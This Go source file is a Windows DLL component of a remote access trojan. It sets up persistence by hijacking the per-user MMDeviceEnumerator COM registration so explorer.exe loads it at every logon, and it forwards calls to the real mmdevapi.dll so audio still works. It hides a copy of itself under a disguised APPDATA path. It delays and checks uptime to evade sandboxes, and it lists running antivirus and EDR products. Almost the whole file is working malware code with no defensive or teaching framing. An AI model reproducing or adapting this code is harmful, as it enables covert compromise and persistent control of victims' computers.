//go:build dll && windows

package main

/*
#include <windows.h>

// getOwnModule returns the HMODULE of this DLL using the address of this
// C function, which lives inside the DLL's .text section.
static HMODULE getOwnModule() {
	HMODULE hm = NULL;
	GetModuleHandleExW(
		GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
		(LPCWSTR)getOwnModule,
		&hm
	);
	return hm;
}

// getOwnPath writes this DLL's full path into buf and returns the length.
static int getOwnPath(wchar_t *buf, int bufLen) {
	HMODULE hm = getOwnModule();
	if (!hm) return 0;
	return (int)GetModuleFileNameW(hm, buf, (DWORD)bufLen);
}
*/
import "C"

import (
	"fmt"
	"io"
	mrand "math/rand"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ================================================================
// COM HIJACK PERSISTENCE — explorer.exe loads our DLL on every logon
//
// Technique: HKCU COM object hijack via MMDeviceEnumerator CLSID.
// Explorer.exe calls CoCreateInstance(CLSID_MMDeviceEnumerator) during
// shell startup to initialize audio. HKCU\Software\Classes\CLSID takes
// precedence over HKLM, so we register our DLL there and explorer loads
// it automatically — no admin, no startup folder, no Run keys.
//
// Our DLL proxies DllGetClassObject / DllCanUnloadNow to the real
// mmdevapi.dll in System32 so audio still works transparently.
//
// Stage 1: rundll32.exe payload.dll,EntryPoint
//   → copies DLL to %APPDATA%\Microsoft\Windows\Shell\
//   → registers COM hijack in HKCU
//   → sets hidden+system attributes
//   → runs RAT immediately
//
// Stage 2: explorer.exe starts on next logon
//   → loads our DLL via COM hijack
//   → COM calls forwarded to real mmdevapi.dll
//   → RAT runs in background goroutine
// ================================================================

const (
	// COM hijack target: MMDeviceEnumerator — loaded by explorer.exe on every login
	comHijackCLSID = `{BCDE0395-E52F-467C-8E3D-C4579291692E}`
	comRegPath     = `Software\Classes\CLSID\` + comHijackCLSID + `\InprocServer32`

	// Drop location — %APPDATA%\Microsoft\Windows\Shell\ exists on all Win10/11
	sideloadSubdir = `Microsoft\Windows\Shell`
	sideloadDLLName = "ShellServiceHost.dll"

	// Real COM DLL that we proxy
	realCOMDLL = "mmdevapi.dll"
)

func sideloadDir() string {
	return filepath.Join(os.Getenv("APPDATA"), sideloadSubdir)
}

func sideloadFullPath() string {
	return filepath.Join(sideloadDir(), sideloadDLLName)
}

// ================================================================
// COM DLL PROXY — forward DllGetClassObject / DllCanUnloadNow
// to real System32\mmdevapi.dll so audio works normally
// ================================================================

var (
	realCOMHandle            syscall.Handle
	realDllGetClassObject    uintptr
	realDllCanUnloadNow      uintptr
)

func initCOMProxy() {
	sysRoot := os.Getenv("SYSTEMROOT")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}
	p := filepath.Join(sysRoot, "System32", realCOMDLL)
	h, err := syscall.LoadLibrary(p)
	if err != nil {
		return
	}
	realCOMHandle = h
	realDllGetClassObject, _ = syscall.GetProcAddress(h, "DllGetClassObject")
	realDllCanUnloadNow, _ = syscall.GetProcAddress(h, "DllCanUnloadNow")
}

//export DllGetClassObject
func DllGetClassObject(rclsid, riid, ppv uintptr) uintptr {
	if realDllGetClassObject != 0 {
		r, _, _ := syscall.SyscallN(realDllGetClassObject, rclsid, riid, ppv)
		return r
	}
	return 0x80040111 // CLASS_E_CLASSNOTAVAILABLE
}

//export DllCanUnloadNow
func DllCanUnloadNow() uintptr {
	if realDllCanUnloadNow != 0 {
		r, _, _ := syscall.SyscallN(realDllCanUnloadNow)
		return r
	}
	return 1 // S_FALSE — keep us loaded
}

// ================================================================
// SELF-PATH RESOLUTION (via CGO GetModuleFileName)
// ================================================================

func getSelfDLLPath() string {
	buf := make([]uint16, 512)
	n := int(C.getOwnPath((*C.wchar_t)(unsafe.Pointer(&buf[0])), 512))
	if n <= 0 {
		return ""
	}
	return syscall.UTF16ToString(buf[:n])
}

// ================================================================
// AV EVASION HELPERS
// ================================================================

var (
	pSetFileAttributesW = kernel32.NewProc("SetFileAttributesW")
	pGetTickCount64     = kernel32.NewProc("GetTickCount64")
)

const (
	fileAttrHidden = 0x02
	fileAttrSystem = 0x04
)

// setHiddenSystem marks a file as hidden+system so it doesn't show
// in normal Explorer views or dir listings.
func setHiddenSystem(path string) {
	p, _ := syscall.UTF16PtrFromString(path)
	pSetFileAttributesW.Call(uintptr(unsafe.Pointer(p)), uintptr(fileAttrHidden|fileAttrSystem))
}

// sandboxSleep adds a random delay and checks if the system uptime
// is suspiciously low (fresh VM/sandbox spin-up).
func sandboxSleep() bool {
	// Random jitter 3–8 seconds — defeats sandbox time-acceleration
	time.Sleep(time.Duration(3+mrand.Intn(6)) * time.Second)

	// Check uptime: sandboxes/AV often have <3 min uptime
	uptime, _, _ := pGetTickCount64.Call()
	if uptime < uintptr(180_000) { // < 3 minutes
		return false // likely sandbox
	}
	return true
}

// isAVProcess checks if common AV/EDR processes are running.
// Returns the list of detected AV names for reporting.
func detectAVProcesses() []string {
	avNames := map[string]string{
		"msmpeng.exe":         "Defender",
		"msseces.exe":         "MSE",
		"avp.exe":             "Kaspersky",
		"avgnt.exe":           "Avira",
		"avguard.exe":         "Avira",
		"bdagent.exe":         "Bitdefender",
		"mbam.exe":            "Malwarebytes",
		"mbamservice.exe":     "Malwarebytes",
		"ekrn.exe":            "ESET",
		"savservice.exe":      "Sophos",
		"sophossps.exe":       "Sophos",
		"coreserviceshell.exe": "TrendMicro",
		"fshoster32.exe":      "F-Secure",
		"repux.exe":           "Norton",
		"ccsvchst.exe":        "Norton",
		"xagt.exe":            "FireEye",
		"firetray.exe":        "FireEye",
		"csfalconservice.exe": "CrowdStrike",
		"senseir.exe":         "MDE",
		"mssense.exe":         "MDE",
		"carbonblack.exe":     "CarbonBlack",
		"cbdefense.exe":       "CarbonBlack",
		"taniumclient.exe":    "Tanium",
		"sentinelagent.exe":   "SentinelOne",
		"cyserver.exe":        "Cylance",
	}

	procs := getProcessList()
	var found []string
	seen := make(map[string]bool)
	for _, p := range procs {
		name := strings.ToLower(p["name"])
		if avName, ok := avNames[name]; ok && !seen[avName] {
			found = append(found, avName)
			seen[avName] = true
		}
	}
	return found
}

// ================================================================
// SIDELOAD INSTALLER — copies DLL + registers COM hijack
// ================================================================

func performSideload() string {
	selfPath := getSelfDLLPath()
	if selfPath == "" {
		return "Sideload failed: cannot determine DLL path"
	}

	targetPath := sideloadFullPath()

	// Already at the target location — just ensure COM is registered
	if strings.EqualFold(selfPath, targetPath) {
		registerCOMHijack(targetPath)
		return "Already sideloaded, COM hijack verified"
	}

	targetDir := sideloadDir()
	os.MkdirAll(targetDir, 0755)

	// Copy DLL to drop location
	src, err := os.Open(selfPath)
	if err != nil {
		return fmt.Sprintf("Sideload read error: %v", err)
	}
	defer src.Close()

	dst, err := os.Create(targetPath)
	if err != nil {
		return fmt.Sprintf("Sideload write error: %v", err)
	}
	defer dst.Close()

	if _, err = io.Copy(dst, src); err != nil {
		return fmt.Sprintf("Sideload copy error: %v", err)
	}

	// Hide the DLL (hidden + system attributes)
	setHiddenSystem(targetPath)

	// Register COM hijack so explorer.exe loads us on next logon
	if err := registerCOMHijack(targetPath); err != nil {
		return fmt.Sprintf("Sideloaded DLL but COM hijack failed: %v", err)
	}

	return fmt.Sprintf("Sideloaded to %s + COM hijack registered (explorer.exe persistence)", targetPath)
}

func registerCOMHijack(dllPath string) error {
	// Write InprocServer32 default value = our DLL path
	if err := regWrite(HKCU, comRegPath, "", dllPath); err != nil {
		return fmt.Errorf("InprocServer32 write failed: %v", err)
	}
	// Write ThreadingModel = Both (required for COM in-process server)
	if err := regWrite(HKCU, comRegPath, "ThreadingModel", "Both"); err != nil {
		return fmt.Errorf("ThreadingModel write failed: %v", err)
	}
	return nil
}

func removeSideload() string {
	var results []string

	// Remove COM hijack registry keys
	regDelete(HKCU, comRegPath, "")
	regDelete(HKCU, comRegPath, "ThreadingModel")
	// Also remove the parent CLSID key to fully clean up
	parentKey := `Software\Classes\CLSID\` + comHijackCLSID
	regDelete(HKCU, parentKey+`\InprocServer32`, "")
	results = append(results, "COM hijack removed")

	// Remove sideloaded DLL
	targetPath := sideloadFullPath()
	if err := os.Remove(targetPath); err != nil && !os.IsNotExist(err) {
		results = append(results, fmt.Sprintf("DLL removal failed: %v", err))
	} else {
		results = append(results, "DLL removed")
	}

	return strings.Join(results, ", ")
}

// ================================================================
// HOOKS — wire DLL-specific commands/cleanup into shared main.go
// ================================================================

func dllCommandHandler(cmd string) (string, bool) {
	switch strings.ToLower(strings.TrimSpace(cmd)) {
	case "sideload":
		return performSideload(), true
	case "unsideload":
		return removeSideload(), true
	}
	return "", false
}

func dllPersistCleanup() {
	regDelete(HKCU, comRegPath, "")
	regDelete(HKCU, comRegPath, "ThreadingModel")
	parentKey := `Software\Classes\CLSID\` + comHijackCLSID
	regDelete(HKCU, parentKey+`\InprocServer32`, "")
	os.Remove(sideloadFullPath())
}

func dllOptionsText() string {
	return `
DLL SIDELOAD
  sideload       - Install COM hijack persistence (explorer.exe)
  unsideload     - Remove COM hijack + sideloaded DLL`
}

// ================================================================
// DLL ENTRY POINTS
// ================================================================

//export EntryPoint
func EntryPoint() {
	// Stage 1: called via rundll32.exe payload.dll,EntryPoint
	// Anti-sandbox check + jitter
	if !sandboxSleep() {
		return
	}
	// Install sideload + COM hijack for persistence
	performSideload()
	// Run RAT (blocking — rundll32 stays alive)
	runAgent()
}

func init() {
	// Register hooks into shared main.go — all DLL-specific strings
	// stay in this file and never appear in the EXE binary.
	extraPersistCleanup = dllPersistCleanup
	extraOptionsText = dllOptionsText
	extraCommandHandler = dllCommandHandler

	// Set up COM proxy so audio works when loaded by explorer.exe
	initCOMProxy()

	// Detect the host process
	exe, _ := os.Executable()
	exeName := strings.ToLower(filepath.Base(exe))

	if exeName != "rundll32.exe" {
		// Stage 2: loaded by explorer.exe (or another host) via COM hijack
		go func() {
			// Jitter before starting RAT — avoid burst of activity at logon
			time.Sleep(time.Duration(5+mrand.Intn(10)) * time.Second)
			runAgent()
		}()
	}
	// If rundll32: COM proxy ready, wait for EntryPoint() call
}

// main is required by -buildmode=c-shared but never called
func main() {}
